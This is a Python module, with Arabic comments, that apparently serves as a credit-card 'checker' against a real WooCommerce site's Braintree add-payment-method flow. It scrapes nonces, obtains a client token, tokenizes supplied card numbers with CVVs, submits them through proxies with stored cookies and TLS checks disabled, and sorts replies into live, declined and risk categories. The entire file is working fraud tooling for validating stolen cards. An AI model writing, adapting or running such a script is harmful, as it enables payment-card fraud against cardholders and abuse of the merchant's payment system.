"""
بوابة الدفع: Braintree Auth B3-1
الموقع: ads.premierguitar.com
نوع البوابة: Braintree Auth (WooCommerce)
تدفق الطلبات:
1. GET /my-account/add-payment-method/ -> استخراج non و client_token_nonce
2. POST /wp-admin/admin-ajax.php -> الحصول على client_token (authorizationFingerprint)
3. POST https://payments.braintree-api.com/graphql -> تحويل بيانات البطاقة إلى token
4. POST /my-account/add-payment-method/ -> إرسال البيانات النهائية والحصول على النتيجة
"""
import aiohttp
import asyncio
import uuid
import ssl
import re
import base64
import json
from cookies_loader import load_cookies, get_cookies_path


async def req1_get_nonces(
    session: aiohttp.ClientSession,
    proxy_url: str = None,
) -> tuple[str, str, str]:
    """الخطوة 1: جلب non و client_token_nonce من صفحة إضافة وسيلة الدفع."""
    u = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
    headers = {
        "authority": "ads.premierguitar.com",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7",
        "referer": "https://ads.premierguitar.com/my-account/payment-methods/",
        "sec-ch-ua": '\"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '\"Android\"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": u,
    }
    try:
        async with session.get(
            "https://ads.premierguitar.com/my-account/add-payment-method/",
            headers=headers,
            proxy=proxy_url,
        ) as r:
            text1 = await r.text()

        non_match = re.search(
            r'id=\"woocommerce-add-payment-method-nonce\"[^>]*value=\"([^\"]+)\'', text1
        )
        nonce_match = re.search(
            r'\"client_token_nonce\"\s*:\s*\"([a-zA-Z0-9]+)\'', text1
        )
        non = non_match.group(1) if non_match else ""
        nonce = nonce_match.group(1) if nonce_match else ""
        return non, nonce, u
    except Exception as e:
        raise RuntimeError(f"req1_get_nonces failed: {e}") from e


async def req2_get_auth_fingerprint(
    session: aiohttp.ClientSession,
    nonce: str,
    u: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 2: الحصول على authorizationFingerprint عبر AJAX."""
    headers = {
        "authority": "ads.premierguitar.com",
        "accept": "*/*",
        "accept-language": "ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://ads.premierguitar.com",
        "referer": "https://ads.premierguitar.com/my-account/add-payment-method/",
        "sec-ch-ua": '\"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '\"Android\"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": u,
        "x-requested-with": "XMLHttpRequest",
    }
    data = {
        "action": "wc_braintree_credit_card_get_client_token",
        "nonce": nonce,
    }
    try:
        async with session.post(
            "https://ads.premierguitar.com/wp-admin/admin-ajax.php",
            headers=headers,
            data=data,
            proxy=proxy_url,
        ) as r:
            res_json = await r.json(content_type=None)

        raw_token = res_json.get("data", {}).get("client_token", "")
        try:
            decoded = json.loads(base64.b64decode(raw_token).decode("utf-8"))
            return decoded.get("authorizationFingerprint", "")
        except Exception:
            return raw_token
    except Exception as e:
        raise RuntimeError(f"req2_get_auth_fingerprint failed: {e}") from e


async def req3_tokenize_card(
    session: aiohttp.ClientSession,
    au: str,
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    u: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 3: تحويل بيانات البطاقة إلى Braintree token عبر GraphQL."""
    headers = {
        "accept": "*/*",
        "accept-language": "ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7",
        "authorization": f"Bearer {au}",
        "braintree-version": "2018-05-10",
        "content-type": "application/json",
        "origin": "https://assets.braintreegateway.com",
        "referer": "https://assets.braintreegateway.com/",
        "user-agent": u,
    }
    json_data = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": str(uuid.uuid4()),
        },
        "query": (
            "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {"
            "  tokenizeCreditCard(input: $input) {"
            "    token creditCard { bin brandCode last4 cardholderName"
            "    expirationMonth expirationYear binData {"
            "      prepaid healthcare debit durbinRegulated commercial payroll"
            "      issuingBank countryOfIssuance productId business consumer"
            "      purchase corporate } } } }"
        ),
        "variables": {
            "input": {
                "creditCard": {
                    "number": cc,
                    "expirationMonth": mes,
                    "expirationYear": ano,
                    "cvv": cvv,
                },
                "options": {"validate": False},
            }
        },
        "operationName": "TokenizeCreditCard",
    }
    try:
        async with session.post(
            "https://payments.braintree-api.com/graphql",
            headers=headers,
            json=json_data,
            proxy=proxy_url,
        ) as r:
            res = await r.json(content_type=None)

        tok = res.get("data", {}).get("tokenizeCreditCard", {}).get("token", "")
        if not tok:
            raise RuntimeError("Braintree tokenization returned empty token")
        return tok
    except Exception as e:
        raise RuntimeError(f"req3_tokenize_card failed: {e}") from e


async def req4_submit_payment(
    session: aiohttp.ClientSession,
    tok: str,
    non: str,
    u: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 4: إرسال وسيلة الدفع النهائية والحصول على نص الاستجابة."""
    headers = {
        "authority": "ads.premierguitar.com",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7",
        "cache-control": "max-age=0",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://ads.premierguitar.com",
        "referer": "https://ads.premierguitar.com/my-account/add-payment-method/",
        "user-agent": u,
    }
    data = {
        "payment_method": "braintree_credit_card",
        "wc-braintree-credit-card-card-type": "master-card",
        "wc-braintree-credit-card-3d-secure-enabled": "",
        "wc-braintree-credit-card-3d-secure-verified": "",
        "wc-braintree-credit-card-3d-secure-order-total": "0.00",
        "wc_braintree_credit_card_payment_nonce": tok,
        "wc_braintree_device_data": "",
        "wc-braintree-credit-card-tokenize-payment-method": "true",
        "woocommerce-add-payment-method-nonce": non,
        "_wp_http_referer": "/my-account/add-payment-method/",
        "woocommerce_add_payment_method": "1",
    }
    try:
        async with session.post(
            "https://ads.premierguitar.com/my-account/add-payment-method/",
            headers=headers,
            data=data,
            proxy=proxy_url,
        ) as r:
            return await r.text()
    except Exception as e:
        raise RuntimeError(f"req4_submit_payment failed: {e}") from e


async def process_B3_1(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الدالة الرئيسية لفحص البطاقة عبر بوابة Braintree Auth B3-1."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    timeout = aiohttp.ClientTimeout(total=20)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            cookies = load_cookies(get_cookies_path("B3-1-Cookies.txt"))
            session.cookie_jar.update_cookies(cookies)

            non, nonce, u = await req1_get_nonces(session, proxy_url)
            au = await req2_get_auth_fingerprint(session, nonce, u, proxy_url)
            tok = await req3_tokenize_card(session, au, cc, mes, ano, cvv, u, proxy_url)
            text = await req4_submit_payment(session, tok, non, u, proxy_url)

    except Exception as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Error: {e}"

    responses = {
        "Success": [
            "Payment method successfully added.",
            "Transaction Approved",
            "Nice! New payment method added",
        ],
        "Declined": [
            "Do Not Honor", "Limit Exceeded", "Cardholder Activity Limit Exceeded",
            "Invalid Credit Card Number", "No Account", "Card Account Length Error",
            "No Such Issuer", "Processor Declined", "Declined - Call For Approval",
            "Declined - Call Issuer", "Declined", "Closed Card",
            "Card Not Activated", "Expired Card",
        ],
        "CCN": [
            "Security Violation", "Declined CVV",
            "Invalid postal code and cvv", "Card Issuer Declined CVV",
        ],
        "RISK": ["Gateway Rejected: risk_threshold", "RISK: Retry this BIN later."],
    }

    pattern = r"Status code (.*?)\n"
    m = re.search(pattern, text)
    response_message = m.group(1).strip() if m else "Unknown Status"

    if response_message == "Unknown Status":
        for p in [p for patterns in responses.values() for p in patterns]:
            if p.lower() in text.lower():
                response_message = p
                break

    category = "Unknown"
    for key, patterns in responses.items():
        if any(p.lower() in response_message.lower() for p in patterns):
            category = key
            break

    status_icon = "❌"
    if category == "Success":
        status_icon = "✅"
    elif category == "CCN":
        status_icon = "✅"
    elif category == "RISK":
        status_icon = "⚠️"

    return f"{status_icon} | {cc}|{mes}|{ano}|{cvv}", response_message
